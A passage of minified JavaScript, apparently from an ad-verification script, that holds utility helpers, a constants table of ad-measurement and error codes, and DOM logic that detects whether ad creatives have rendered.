    var t = "object" == typeof this.iterable,
      n = null === this.iterable,
      r = t && !n,
      i = !this.isArray() && r;
    return e ? r : i;
  }, h.prototype.isArray = function () {
    "use strict";

    return this.iterable instanceof Array;
  }, h.prototype.isEmpty = function (e) {
    "use strict";

    return 0 === this.keys(e).length;
  }, h.prototype.each = function (e, t) {
    "use strict";

    var n = this.iterable;
    if (n.length === +n.length) for (var r = 0, i = n.length; r < i; ++r) e(r, n[r]);else for (var o in n) (n.hasOwnProperty(o) || t) && e(o, n[o]);
  }, h.prototype.map = function (e, t) {
    "use strict";

    var n = [];
    return this.each(function (r, i) {
      var o = e(r, i);
      (void 0 !== o || t) && (n[n.length] = o);
    }), n;
  }, h.prototype.stringify = function (e, t) {
    "use strict";

    t = t || ",";
    var n = [];
    return this.each(function (t, r) {
      var i = e(t, r);
      I.isDef(i) && n.push(i);
    }), n.join(t);
  }, h.prototype.toION = function (e, t) {
    "use strict";

    var n,
      r = "[",
      i = "]";
    return t = t || 0, e = e || {}, ++t > 4 ? "object" : !this.isObj(!0) || this.iterable.hasOwnProperty("toString") ? "" + this.iterable : (this.isArray() ? n = this.map(function (n, r) {
      return I(r).toION(e, t);
    }) : (r = "{", i = "}", n = this.map(function (n, r) {
      var i = "string" == typeof n && -1 !== n.indexOf("NULL"),
        o = I(r).toION(e, t);
      return i ? o : (e[n] || n) + ":" + o;
    })), r + n.join(",") + i);
  }, h.prototype.compareTo = function (e) {
    "use strict";

    var t = !1;
    return this.each(function (n, r) {
      e[n] !== r && (t || (t = {}), t[n] = r);
    }), t;
  }, h.prototype.toParams = function (e) {
    "use strict";

    return this.stringify(function (e, t) {
      return "string" == typeof e && -1 !== e.indexOf("NULL") ? t : e + ":" + t;
    }, e);
  }, h.prototype._privateMixin = function (e, t, n) {
    "use strict";

    var r;
    for (r in t) I.isDef(t[r]) && (n || t.hasOwnProperty(r)) && (e[r] = t[r]);
    return e;
  }, h.prototype.mapToObj = function (e) {
    "use strict";

    var t = {},
      n = this;
    return this.each(function (r, i) {
      var o = e(r, i);
      I(o).isObj() && n._privateMixin(t, o);
    }), t;
  }, h.prototype.invert = function () {
    "use strict";

    return this.mapToObj(function (e, t) {
      var n = {};
      return n[t] = e, n;
    });
  }, h.prototype.mixin = function (e, t) {
    "use strict";

    return this._privateMixin(this.iterable, e, t);
  }, h.prototype.find = function (e) {
    "use strict";

    var t;
    return this.each(function (n, r) {
      e(n, r) && (t = r);
    }), t;
  }, h.prototype.findFirst = function (e) {
    "use strict";

    var t, n;
    return this.each(function (r, i) {
      !n && e(r, i) && (t = i, n = !0);
    }), t;
  }, h.prototype.keys = function (e) {
    "use strict";

    var t = [];
    return this.each(function (e) {
      t.push(e);
    }, e), t;
  }, h.prototype.asStrings = function () {
    "use strict";

    var e = {};
    return this.each(function (t, n) {
      e[t] = "" + n;
    }), e;
  }, h.prototype.selectProperties = function (e) {
    "use strict";

    var t = {},
      n = this;
    return I(e).each(function (e, r) {
      I.isDef(n.iterable[r]) && (t[r] = n.iterable[r]);
    }), t;
  }, h.prototype.filter = function (e, t) {
    "use strict";

    return this.map(function (t, n) {
      var r;
      return (I.isUndef(e) || I.resolve(e, t, n)) && (r = n), r;
    }, t);
  }, h.prototype.toArray = function () {
    "use strict";

    return this.map(function (e, t) {
      return t;
    });
  }, h.prototype.JSONStringify = function () {
    "use strict";

    var e,
      n,
      r = !1;
    return t.Prototype && t.Prototype.Version && -1 === t.Prototype.Version.indexOf("1.7") && (r = !0), r && (n = Array.prototype.toJSON, delete Array.prototype.toJSON), e = JSON.stringify(this.iterable), r && (Array.prototype.toJSON = n), e;
  }, h.prototype.contains = function (e) {
    "use strict";

    var t = I(this.iterable).findFirst(function (t, n) {
      return e === n;
    });
    return I.isDef(t);
  }, I.toBase = function (e, t) {
    "use strict";

    var n,
      r = e < 0,
      i = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ".split(""),
      o = [];
    e = r ? -e : e;
    do {
      n = e % t, o.push(i[n]), e = (e - n) / t;
    } while (e > 0);
    return o = o.reverse().join(""), r ? "-" + o : o;
  }, I.isDef = function (e) {
    "use strict";

    return void 0 !== e;
  }, I.isUndef = function (e) {
    "use strict";

    return !I.isDef(e);
  }, I.isBool = function (e) {
    "use strict";

    return "boolean" == typeof e;
  }, I.noop = function () {}, I.identity = function (e) {
    "use strict";

    return e;
  }, I.isFunction = function (e) {
    "use strict";

    return "function" == typeof e;
  }, I.isStr = function (e) {
    "use strict";

    return "string" == typeof e;
  }, I.useIfDef = function (e) {
    "use strict";

    return !!I.isDef(e) && e;
  }, I.stringifyTriState = function (e) {
    "use strict";

    return !0 === e ? 1 : !1 === e ? 0 : "na";
  }, I.getNum = function (e) {
    "use strict";

    var t = parseInt(e);
    return isFinite(t) || (t = -1), t;
  }, I.resolve = function (e, ...t) {
    return I.isFunction(e) ? e.apply({}, t) : e;
  }, I.flatJSONParse = function (e) {
    "use strict";

    for (var t, n, r, i = /"(\w+)":(\d+|(?:"([^"]*)"))/g, o = {}, a = i.exec(e); a;) t = a[1], n = a[3], r = a[2], o[t] = n || +r, a = i.exec(e);
    return o;
  }, I.debounce = function (e, n, r) {
    "use strict";

    var i,
      o = r || t;
    return function (...t) {
      var r = this,
        a = t;
      o.clearTimeout(i), i = o.setTimeout(function () {
        i = null, e.apply(r, a);
      }, n);
    };
  }, I.last = function (e) {
    "use strict";

    return e[e.length - 1];
  }, I.collapseArgsIntoHash = function (e, t) {
    "use strict";

    var n = {};
    return t ? n[e] = t : n = e, n;
  }, I.fromBoolToNum = function (e) {
    "use strict";

    return e ? 1 : 0;
  }, I.isNumeric = function (e) {
    "use strict";

    return I.isDef(e) && null !== e && !isNaN(e);
  }, I.fromNodeListToArray = function (e) {
    "use strict";

    return Array.prototype.slice.call(e);
  }, I.encodeInvalidUrlChars = function (e, t) {
    "use strict";

    var n = {
        $: "%24",
        "[": "%5B",
        "]": "%5D",
        "{": "%7B",
        "}": "%7D",
        "|": "%7C"
      },
      r = e;
    return t && "string" == typeof e && (r = (r = e.replace(/%(?![0-9A-F][0-9A-F])/gi, "%25")).replace(/\$|\[|\]|\{|\}|\|/gi, function (e) {
      return n[e];
    })), r;
  };
  var T = function () {
    "use strict";

    var e,
      t = {},
      n = [],
      r = [],
      i = function () {
        var e = {},
          t = I(arguments).toArray();
        return t.unshift(e), r.push(t), e;
      },
      o = function (r, i, o, a, s) {
        var c,
          u,
          d,
          g = function () {
            if (!c) {
              var t = [];
              c = !0, i = ["features", "browser", "context"], 0 === n.length && (n = I(i).map(function (t, n) {
                return e.request(n);
              })), s.emits && (r.events = new q()), s.applies && !s.applies.apply(s, n) || (u = !0, (t = I(o).map(function (t, n) {
                return e.request(n);
              }, !0)).push(r), I(r).mixin(a.apply({}, t)));
            }
            var i;
          };
        return d = (s = s || {}).tier, I.isDef(d) && (t[d] = t[d] || new X(), t[d].push(g)), e.provide(i, function () {
          var e;
          return g(), u && (e = r), e;
        }), r;
      };
    return i.runAll = function () {
      var e = I(t).keys().sort(function (e, t) {
        return e - t;
      });
      I(e).each(function (e, t) {
        i.runTier(t);
      });
    }, i.runTier = function (e) {
      t[e].run(), delete t[e];
    }, i.startSystem = function () {
      e = e || new j(), I(r).each(function (e, t) {
        o.apply({}, t);
      });
    }, i.getAggregator = function () {
      return e;
    }, i;
  }();
  const A = {
    MRC_LARGE_AD_SIZE: 242500,
    IN_VIEW: "inView",
    OUT_OF_VIEW: "outOfView",
    PARTIAL_VIEW_PLUS: "partialViewPlus",
    PARTIAL_VIEW_MINUS: "partialViewMinus",
    NA: "na",
    PIV_NA: -1,
    DT_CODES: {
      ADTALK: "a",
      DIAGNOSTIC: "b",
      PERFORMANCE: "e",
      THIRD_PARTY: "i",
      LARGE_BILLABLE: "l",
      VIDEO_EVENTS: "m",
      PING: "p",
      FULLY_INVIEW: "pf",
      QUARTILE_FULLY_INVIEW: "qf",
      SCA: "s",
      POS_INVIEW: "t",
      UNLOAD: "u",
      VIEWABILITY_READY: "v",
      EXTERNAL: "x",
      CUSTOM: "c",
      XSCA: "xs",
      ADSERVER_MACROS: "as"
    },
    DT_SLOT: {
      IM: "im",
      FF: "sca",
      FF_EXP: "xsca",
      ENVIRONMENT: "env"
    },
    DETECTION_METHODS: {
      AD_PLACEHOLDER: "s",
      AD_HUNT: "a",
      IFRAME: "i",
      VIDEO: "v",
      MRAID: "m",
      OMID: "o1",
      MUTATION: "c",
      SPECIFIED_AD: "sp",
      SPECIFIED_AD_COMPOUND: "spc",
      BUSTED_IFRAME_FLASHTALKING: "bf",
      BUSTED_IFRAME_YIELDMO: "by",
      BUSTED_IFRAME_SIZMEK: "bs",
      VENDOR_CELTRA: "vc"
    },
    ENGAGEMENT: {
      CLICKS: "clks",
      HOVER: "hov"
    },
    OUT_OF_VIEW_REASONS: {
      GEOM: "l",
      OBSTRUCTION: "o",
      FOCUS: "f",
      COLLAPSED: "c",
      HIDDEN: "h",
      RENDER: "r",
      VIDEO: "v",
      WINDOW: "w"
    },
    PERF_TIMELINE_TRACKER_CONFIG: {
      VANS: {
        TYPE: "vans",
        COUNT: 4
      },
      WRAPPERS: {
        JS: {
          TYPE: "jswrapper",
          COUNT: 15
        },
        AS: {
          TYPE: "flwrapper",
          COUNT: 9
        }
      },
      RENDER: {
        TYPE: "render",
        COUNT: 2,
        CODE: "tdr"
      }
    },
    ERROR_CODES: {
      GET_AD_DIMENSIONS: "a",
      AD_SLOT_ID: "A",
      AD_SERVER_POST_IMPRESSION_MACRO: "A2",
      BAPI_CALLBACK: "b",
      BROWSER_NOT_HTML5_COMPATIBLE: "B",
      ADTALK_GENERAL: "c",
      COCOA_GONE: "C",
      CLICK_TRACK: "Q",
      GET_SCREEN_LOC_GET_DIMENSIONS: "d",
      ADTALK_DUBIOUS: "D",
      IMPRESSION_PERFORMANCE: "e",
      POST_IMPRESSION: "E",
      ADTALK_DELAY: "f",
      VIDEO_IN_IFRAME_DIMS_CALC: "F",
      GDPR: "g",
      INIT_ADS_MANAGER: "G",
      PHONE_HOME: "h",
      FEATURE_SCRIPT: "H",
      HIDDEN: "H1",
      HIDDEN2: "H2",
      UID_GENERATION: "i",
      IMPRESSION_URLS: "I",
      NOT_VPAID_EVENT_OBJECT: "j",
      JSINFO: "J",
      KILL_IT: "k",
      NO_RESPONSE_XML: "K",
      LOCATION_DETAILS: "l",
      IMPRESSION_LEADUP: "L",
      MESSAGE_LISTENER: "m",
      MOBILE_APP: "M",
      AT_INIT: "N",
      AUTOPLAY_DETECTION: "n",
      ANCESTOR_ORIGINS: "o",
      EVENT_LOOP_ONE: "O",
      GET_SCREEN_LOC_PIV_CALC: "p",
      PLUGIN_PARSING: "P",
      NO_ORIGINAL_VAST: "q",
      AD_REFRESH: "r",
      AD_ERROR: "R",
      GET_ELEM_STYLE: "s",
      AT_SEND: "S",
      ADS_MANAGER_START_AD: "t",
      NO_COMPANION_AD_XML: "T",
      NO_VIDEO_AD_INTERFACE: "u",
      UNRECOGNIZED_EVENT_TYPE: "U",
      ENVIRONMENT: "v",
      CHECK_SCREEN_LOC: "V",
      GET_WIN_DIMENSIONS: "w",
      AC_WATCHER: "W",
      EXCHANGE_PARSING: "x",
      SCA: "X",
      BUSTED_IFRAME_IN_IO: "y",
      FLASH_API_ACCESS: "z",
      XSCA: "Z"
    },
    BROWSERS: {
      WEBKIT: "w",
      OPERA: "o",
      GECKO: "g",
      CHROME: "c",
      MSEDGE: "e",
      IE: "i",
      DOMLESS: "d"
    },
    MEDIA_TYPE_CODE: "mtp",
    MEDIA_TYPE: {
      DISPLAY: "display",
      DISPLAY_CODE: "d",
      VIDEO: "video",
      VIDEO_CODE: "v"
    },
    MEASUREMENT_STRATEGY: {
      DISPLAY: "display",
      VIDEO: "video"
    },
    TIERS: {
      PRE_IMPRESSION_FRAUD: 4,
      VIEWABILITY: 7,
      ENVIRONMENT: 8
    },
    IMPRESSION_EVENT: "impression",
    DATA_TRANSFER_EVENT: "dt",
    CALLBACK_IDENTIFIER: "data-ias-callback",
    AD_IDENTIFIER: "data-integralas-id",
    IAS_DETECTOR: "iasdetector",
    CONTAINER_GEOMETRY_MEASUREMENT_CHANGED: "containerGeometryMeasurementChanged",
    OMID_GEOMETRY_MEASUREMENT_CHANGED: "omidGeometryChanged",
    VIEWABILITY_IN_VIEW_THRESHOLDS_INTERSECTION_OBSERVER: [0, .01, .2, .25, .3, .5, .7, .75, .8, .99, 1],
    VIEWABILITY_IN_VIEW_THRESHOLDS_MOBILE_GRID: [0, .1, .2, .25, .3, .4, .5, .6, .7, .75, .8, .9, 1],
    GROUPM_MOBILE_PASS_THRU_TIME_IN_VIEW_THRESHOLD_TYPE: "grpmMobPassThru",
    REFERRER_POLICY: "no-referrer-when-downgrade",
    RENDER: {
      CREATIVE_NODE_TYPES: ["CANVAS", "EMBED", "IMG", "OBJECT", "PICTURE", "SVG", "VIDEO"],
      CONTAINER_NODE_TYPES: ["A", "DIV", "IFRAME", "INS"],
      WIDTH_THRESHOLD: 20,
      HEIGHT_THRESHOLD: 20,
      STATUS: {
        OTHER: "0",
        DETECTED: "1"
      },
      DETAILS: {
        ENVIRONMENT: "env",
        OTHER: "na"
      },
      DIAGNOSTIC: {
        BROKEN_IMAGE: "bi",
        UNQUALIFIED_SIZE: "us",
        QUALIFIED_SIZE: "qs",
        STYLED_NODE: "sn",
        TEXT_NODE: "tn",
        DOCUMENT_READY: "dr",
        LOAD_FIRED: "lf",
        CONTENT_STYLED: "cs",
        MRAID_DEFAULT: "md",
        MRAID_READY: "mr",
        MRAID_LOADING: "ml",
        MRAID_UNKNOWN: "mu",
        OMID_RENDERED: "or",
        OMID_UNRENDERED: "ou"
      }
    },
    RTS_KEY_FOR_VQ: "qiv",
    UNIQUE_ID_TOKEN: "[IAS_ASID]"
  };
  var _ = "mf",
    D = "cm",
    v = "in",
    S = "pr",
    O = "po",
    R = "bl",
    N = "lo",
    y = "lt",
    C = "md",
    M = "id",
    w = function (e) {
      "use strict";

      return {
        verifyContextNode: function () {
          !(__IASScope.isDomless || e.contextNode && null !== e.contextNode.parentNode) && (e.contextNode = function () {
            var t,
              r = n.getElementsByTagName("script"),
              i = r.length,
              o = r[i - 1],
              a = e.scriptUrl;
            try {
              for (; --i >= 0;) if ((t = r[i]).src && 0 === t.src.indexOf(a) && null === t.getAttribute("data-ias-script-tag")) {
                o = t, t.setAttribute("data-ias-script-tag", "found");
                break;
              }
            } catch (e) {}
            return o;
          }());
        }
      };
    },
    b = function () {
      "use strict";

      var t,
        n = ["STYLE", "SCRIPT", "HEAD", "META"],
        r = A.RENDER.CREATIVE_NODE_TYPES.concat(A.RENDER.CONTAINER_NODE_TYPES),
        i = 0,
        o = g.measurementConfig.useFIF && Ae.friendlyIframe || Ae.isSpecifiedAd(),
        a = 0,
        s = [],
        c = function (t) {
          var n,
            r,
            o = t,
            a = t,
            s = Ae.friendly ? We.getTop().document.body : e.contextNode.ownerDocument.body;
          for (; i < 3;) {
            if (s && o === s) {
              a = o, i = 3;
              break;
            }
            Oe.isWindow(o) && (r = void 0, r = "[" + A.AD_IDENTIFIER + "-" + e.asid + "]", n = Oe.crossQuerySelector(r), o = I.isDef(n) ? n : o), a = o = I.isDef(o) && o.parentNode || o, i++;
          }
          return a;
        },
        u = function (e) {
          var t = function (e) {
            var t,
              i,
              o = [],
              a = e && e.getElementsByTagName && e.getElementsByTagName("*"),
              s = a && a.length;
            if (a) for (var c = 0; c < s; c++) i = (t = a[c]) && t.nodeName && t.nodeName.toUpperCase(), !t.children || 0 !== t.children.length || I(r).contains(i) || I(n).contains(i) || I(o).contains(i) || o.push(i);
            return o;
          }(e);
          return r.concat(t);
        },
        d = function (t) {
          var n,
            r = o ? c(t) : t;
          return Oe.isWindow(r) ? n = function (t) {
            var n;
            try {
              n = t.document;
            } catch (t) {
              n = e.contextNode.ownerDocument;
            }
            return n;
          }(r) : "IFRAME" === Oe.getNodeName(r) ? (s.push(t), n = t.contentWindow.document) : n = r, n;
        },
        f = function (n) {
          var r,
            i = Oe.isNodeXDomainIframe(n) || Oe.isNodeCreative(n),
            o = !n;
          if (t = o ? e.contextNode.parentNode : n, i || o) (r = s.length) > 0 && (a < r ? a = r : (a = 0, s = [])), T.getAggregator().trigger(F.EVALUATE_CREATIVE_FINDER_RESULT, n);else {
            var c = d(n),
              g = u(c);
            new P(g, s).searchDescendants(c);
          }
        };
      return T.getAggregator().on(F.CREATIVE_FINDER_BATCH_COMPLETED, f), {
        find: f,
        getClosestContainerName: function () {
          return Oe.getNodeName(t);
        }
      };
    },
    P = function (t, n) {
      "use strict";

      var r = t,
        i = function (e) {
          var t = 0,
            r = null,
            i = -1;
          function o(e) {
            if (o = e, a = Oe.getNodeName(o), s = Oe.isNodeCreative(o) || "IFRAME" === a, a && s && !Oe.isEmptyFriendlyFrame(e)) {
              var t = Oe.getNodeArea(e);
              t > i && !I(n).contains(e) && (r = e, i = t);
            }
            var o, a, s;
          }
          e.length && T.getAggregator().request("useYieldSearch") ? function n() {
            do {
              o(e[t]), t += 1;
            } while (t % 500 != 0 && t < e.length);
            t < e.length ? We.execAtEndOfThread(n, 0) : T.getAggregator().trigger(F.CREATIVE_FINDER_BATCH_COMPLETED, r);
          }() : function () {
            for (; t < e.length; t++) o(e[t]);
            T.getAggregator().trigger(F.CREATIVE_FINDER_BATCH_COMPLETED, r);
          }();
        };
      return {
        searchDescendants: function (t) {
          var n = t || e.contextNode.parentNode,
            o = Oe.collectCandidateElements(n, r);
          i(o);
        }
      };
    },
    V = function () {
      "use strict";

      var e,
        t = !1,
        n = !1,
        r = !1,
        i = {
          status: A.RENDER.STATUS.OTHER,
          details: A.RENDER.DETAILS.OTHER
        },
        o = {
          status: A.RENDER.STATUS.DETECTED,
          details: A.RENDER.DETAILS.ENVIRONMENT
        },
        a = "rend",
        s = "renddet",
        c = T.getAggregator().request(x.OMID_AD_SESSION_CONTEXT),
        u = function () {
          var e = !1;
          return Ae.isOmid() && c && c.useOMID13Logic && (e = !0), e;
        },
        d = function () {
          t = !0, r = !0;
        },
        g = function (n) {
          var r = e.build(),
            o = n.status || i.status,
            c = r || i.details;
          o === A.RENDER.STATUS.DETECTED && T.getAggregator().trigger(F.PERF_CHECKPOINT, {
            type: A.PERF_TIMELINE_TRACKER_CONFIG.RENDER.TYPE,
            timestamp: We.now(),
            code: A.PERF_TIMELINE_TRACKER_CONFIG.RENDER.CODE
          }), t && o === A.RENDER.STATUS.DETECTED ? (T.getAggregator().trigger(F.ADD_THROTTLED_OUTPUT_ITEM, a, o), T.getAggregator().trigger(F.ADD_THROTTLED_OUTPUT_ITEM, s, c)) : (T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: o
          }, a), T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: c
          }, s));
        },
        f = function () {
          var t = c && !!c.isVideo,
            r = !u() || c && !!c.videoStartArrived,
            i = !u() || c && !!c.geometryArrived,
            a = !c.omidEarlyExit || c.omidImpressionArrived,
            s = !(c.omidEarlyExit && u()) || c.omidLoadedArrived;
          return !(n || !i || !a || !s || t && !r) && (T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: Ae.getTagTime()
          }, "oren"), T.getAggregator().trigger(F.ELIGIBLE_RENDER), e.save(A.RENDER.DETAILS.ENVIRONMENT), e.save(A.RENDER.DIAGNOSTIC.OMID_RENDERED), T.getAggregator().trigger("adRendered"), g(o), n = !0, !0);
        };
      return {
        start: function () {
          var t = !1;
          T.getAggregator().trigger(F.PERF_CHECKPOINT, {
            type: A.PERF_TIMELINE_TRACKER_CONFIG.RENDER.TYPE,
            timestamp: We.now(),
            code: W.INITIAL
          }), T.getAggregator().on(F.AD_RENDERED, function () {
            t = !0;
          }), T.getAggregator().provide(x.AD_RENDER_STATUS, function () {
            return t;
          }), T.getAggregator().provide(x.USE_YIELD_SEARCH, function () {
            return r;
          }), e = new B(), new G(), T.getAggregator().on(F.IMPRESSION_SENT, d), u() || c.omidEarlyExit ? f() || (e.save(A.RENDER.DETAILS.ENVIRONMENT), e.save(A.RENDER.DIAGNOSTIC.OMID_UNRENDERED), g(i), T.getAggregator().on("omidrendgeoupdate", function () {
            f();
          }), T.getAggregator().on(F.OMID_REND_VIDEO_START, function () {
            f();
          }), c.omidEarlyExit && (T.getAggregator().on("omidimpressionarrived", function () {
            f();
          }), T.getAggregator().on("omidloadedarrived", function () {
            f();
          }))) : Ae.isOmid() || Ae.isVideo() ? (T.getAggregator().trigger(F.ELIGIBLE_RENDER), e.save(o.details), T.getAggregator().trigger("adRendered"), g(o)) : (g(i), L(g, i, e));
        }
      };
    };
  const L = function (e, t, n) {
    T.getAggregator().on(F.PRIMARY_AD_FOUND, function (r) {
      let i;
      const o = b();
      let a = !0;
      const s = "data-ias-rend-bi",
        c = function (e) {
          e && (e.status = "1"), T.getAggregator().trigger("adRendered");
        },
        u = function (e) {
          let t = !0;
          const r = I.isDef(e.naturalWidth) ? e.naturalHeight * e.naturalWidth : 0,
            i = getComputedStyle(e),
            o = 0 === e.src.length && Xe.contains(i.content, "url"),
            a = e.getAttribute && e.getAttribute(s);
          return r > 0 && !o && (t = !1), "false" === a && (n.save("cs"), t = !1), o && !a && function (e, t) {
            n.save("cs");
            const r = /url(?:\(['"]?)(.*?)(?:['"]?\))/.exec(t.content),
              i = r && r[1],
              o = Oe.createImage(),
              a = e;
            o.onload = function () {
              o.naturalHeight * o.naturalWidth > 0 && a.setAttribute && a.setAttribute(s, !1);
            }, o.src = i, a.setAttribute(s, !0);
          }(e, i), t;
        },
        d = function () {
          i ? We.clearInterval(i) : a = !1;
        };
      T.getAggregator().on(F.EVALUATE_CREATIVE_FINDER_RESULT, function (r) {
        let i;
        Oe.isNodeXDomainIframe(r) ? (d(), t = function (t) {
          const r = {},
            i = "readystatechange",
            o = "load",
            a = We.getDoc(),
            s = "complete" === a.readyState,
            u = function (s) {
              const d = s && s.type;
              (d === i && "complete" === s.target.readyState || d === o) && (c(r), n.saveNode(t), "readystatechange" === d ? n.save("dr") : "load" === d && n.save("lf"), e(r), _e.removeEvent(t, o, u), _e.removeEvent(a, i, u));
            };
          return s ? (c(r), n.saveNode(t), n.save("dr")) : (_e.addEvent(t, o, u, void 0), _e.addEvent(a, i, u, void 0)), r;
        }(r)) : r ? (function (e) {
          let t = !1;
          const r = Oe.getRect(e);
          return e && "IMG" === Oe.getNodeName(e) && u(e) && (t = !0, n.save("bi")), !t && r.width >= 20 && r.height >= 20;
        }(r) && (c(t), d()), n.saveNode(r)) : (i = o.getClosestContainerName() || n.getAdNodeName(r) || t.details, n.save(i)), e(t);
      });
      const g = function () {
          const e = r && r.getAdNode();
          try {
            o.find(e);
          } catch (e) {
            T.getAggregator().trigger(F.RENDER_DIAG, e);
          }
        },
        f = T.getAggregator().request(x.MOBILE_APP);
      f && f.isMobileAppEnvironment && f.isMobileAppEnvironment() && Ae.isMraid() ? function (e, n) {
        const r = We.getWindow().mraid,
          i = r && r.getState && r.getState(),
          o = "ready",
          a = t,
          s = function () {
            _e.removeEvent(r, o, s), n.save("env"), n.save("mr"), T.getAggregator().trigger("adRendered"), e({
              status: "1"
            });
          };
        n.save("env"), "default" === i ? (T.getAggregator().trigger("adRendered"), n.save("md"), a.status = "1") : "loading" === i ? (_e.addEvent(r, o, s, void 0), n.save("ml")) : (_e.addEvent(r, o, s, void 0), n.save("mu")), e(a);
      }(e, n) : (g(), a && (i = We.setInterval(g, 500))), T.getAggregator().trigger(F.ELIGIBLE_RENDER);
    });
  };
  var F,
    U,
    x,
    W,
    B = function () {
      "use strict";

      var e = [],
        t = [],
        n = function (e) {
          var t;
          if (Oe.isWindow(e)) t = "WINDOW";else if (Oe.isNodeXDomainIframe(e)) t = "XIFRAME";else try {
            t = Oe.getNodeName(e);
          } catch (e) {
            r("nen");
          }
          return t;
        },
        r = function (t) {
          e.push(t);
        };
      return {
        build: function () {
          var n = [];
          return I(t).each(function (e, t) {
            n.push(t);
          }), I(e).each(function (e, t) {
            n.push(t);
          }), t = [], e = [], n.join(".");
        },
        getAdNodeName: n,
        save: r,
        saveNode: function (e) {
          try {
            var i = e && n(e),
              o = e && Oe.getRect(e),
              a = e && Oe.hasBackgroundImage(e),
              s = e && e.children && 0 === e.children.length,
              c = e && e.innerText && e.innerText.length > 0,
              u = s && c,
              d = o && o.width >= A.RENDER.WIDTH_THRESHOLD && o.height >= A.RENDER.HEIGHT_THRESHOLD ? A.RENDER.DIAGNOSTIC.QUALIFIED_SIZE : A.RENDER.DIAGNOSTIC.UNQUALIFIED_SIZE;
            t.push(i), t.push(d), a && t.push(A.RENDER.DIAGNOSTIC.STYLED_NODE), u && t.push(A.RENDER.DIAGNOSTIC.TEXT_NODE);
          } catch (e) {
            r("sne");
          }
        }
      };
    },
    G = function (t) {
      "use strict";

      var n,
        r = !1,
        i = !1,
        o = "1",
        a = "0",
        s = function () {
          r = !0, u();
        },
        c = function (e) {
          n = e, u();
        },
        u = function () {
          T.getAggregator().trigger(F.ADD_OUTPUT_ITEM, {
            output: !n && r ? o : a
          }, W.MEASURABLE_FOR_RENDER), n && n.message && !i && (__IntegralASDiagnosticCall("renderloop", n, e), T.getAggregator().trigger(F.ADD_THROTTLED_PROP, A.DT_SLOT.ENVIRONMENT, "rle", 1), i = !0);
        };
      T.getAggregator().on(F.ELIGIBLE_RENDER, s), T.getAggregator().on(F.RENDER_DIAG, c), u();
    },
    k = function () {
      "use strict";

      return {
        applies: function (e, t) {
          var n = T.getAggregator().request(x.MOBILE_APP);
          return (e.browserIs(A.BROWSERS.CHROME) || e.isAndroidWebViewBrowser() || e.browserIs(A.BROWSERS.WEBKIT) || e.browserIs(A.BROWSERS.MSEDGE)) && !n.isMobileAppEnvironment() && e.hasIntersectionObserver();
        }
      };
    },
    H = function () {
      "use strict";

      var e,
        t,
        n = !1,
        r = T.getAggregator().request(x.PAGE),
        i = function () {
          !n && t && e && !r.isHidden() && (n = !0, T.getAggregator().trigger(F.SEND_DT, A.DT_CODES.LARGE_BILLABLE));
        };
      T.getAggregator().on(F.PRIMARY_AD_FOUND, function (t) {
        e = t.getDims().area() >= A.MRC_LARGE_AD_SIZE, i();
      }), T.getAggregator().on(F.IMPRESSION_SENT, function () {
        t = !0, i();
      }), r.onHiddenChange(i);
    },
    Y = function () {
      "use strict";

      var e = [],
        t = {},
        n = {
          percentInView: "piv",
          sl: "vs",
          reason: "r",
          width: "w",
          height: "h",
          omidObstructions: "oobs"
        },
        r = {
          omidObstructions: ["sl", "percentInView", "reason"]
        };
      T.getAggregator().on(F.NEW_SCREEN_EVENT, function (r) {
        var o = I(r).selectProperties(I(n).keys()),
          a = I(o).asStrings(),
          s = I(a).compareTo(t);
        (s = i(s)) && JSON.stringify(s) !== JSON.stringify({}) && (s.t = Ae.getTagTime(), e.push(s)), I(t).mixin(a);
      });
      var i = function (e) {
        return I(r).each(function (t, n) {
          var r = !1;
          I(n).each(function (t, n) {
            e[n] && (r = !0);
          }), !1 === r && delete e[t];
        }), e;
      };
      return {
        toString: function () {
          return I(e).toION(n);
        }
      };
    },
    j = function () {
      "use strict";

      var e = new Z(),
        t = new q();
      return I(e).mixin(t);
    };
  !function (e) {
    e.AD_COMPONENT_ADDED = "adComponentAdded", e.AD_COMPONENT_CLICKED = "adComponentClicked", e.AD_COMPONENT_TOUCHED = "adComponentTouched", e.AD_COMPONENT_MOUSED_OVER = "adComponentMousedOver", e.AD_COMPONENT_MOUSED_OUT = "adComponentMousedOut", e.AD_COMPONENT_REMOVED = "adComponentRemoved", e.AD_IMPRESSION = "adImpression", e.AD_RENDERED = "adRendered", e.AD_SESSION_COMPLETE = "adSessionComplete", e.AD_USER_INTERACTION = "adUserInteraction", e.AD_VIDEO_COMPLETE = "adVideoComplete", e.AD_VIDEO_START = "adVideoStart", e.ADD_OUTPUT_ITEM = "addOutputItem", e.ADD_THROTTLED_OUTPUT_ITEM = "addThrottledOutputItem", e.ADD_THROTTLED_PROP = "addThrottledProp", e.CREATIVE_FINDER_BATCH_COMPLETED = "creativeFinderBatchCompleted", e.DEFERRED_AD_SESSION_READY = "deferredAdSessionReady", e.DELAYED_VIEWABILITY_READY = "delayedViewabilityReady", e.DELAYED_VIEWABILITY_READY_CALL_ONLY = "delayedViewabilityReadyCallOnly", e.ELIGIBLE_RENDER = "eligiblerender", e.END_AD_SESSION = "endAdSession", e.ERROR = "error", e.EVALUATE_CREATIVE_FINDER_RESULT = "evaluateCreativeFinderResult", e.EXEC = "exec", e.GET_JSON = "getJSON", e.IMPRESSION_SENT = "impressionsent", e.INTERNALLY_GENERATED_GEOMETRY_EVENT = "internallyGeneratedGeometryEvent", e.IO_PIV_CHANGE = "IOPivChange", e.JSONP = "jsonp", e.MARK_TIME = "markTime", e.MEASURABLE = "measurable", e.MEASURE_TIME = "measureTime", e.NEW_SCREEN_EVENT = "newScreenEvent", e.NEW_STATE = "newState", e.NODES_ADDED = "nodesAdded", e.NOTIFY = "notify", e.OMID_AD_DURATION = "omidAdDuration", e.OMID_IMPRESSION_ARRIVED = "omidimpressionarrived", e.OMID_LOADED_ARRIVED = "omidloadedarrived", e.OMID_REND_GEO_UPDATE = "omidrendgeoupdate", e.OMID_REND_VIDEO_START = "omidrendvideostart", e.PERF_CHECKPOINT = "perfCheckpoint", e.PRIMARY_AD_FOUND = "primaryadfound", e.RENDER_DIAG = "renderdiag", e.SEND = "send", e.SEND_DIAG = "sendDiag", e.SEND_DT = "sendDt", e.SEND_MIN_DT = "sendMinDt", e.START_VIEWABILITY_LOOP = "startViewabilityLoop", e.STOP_AD_TALK = "stopAdTalk", e.UNLOAD = "unload", 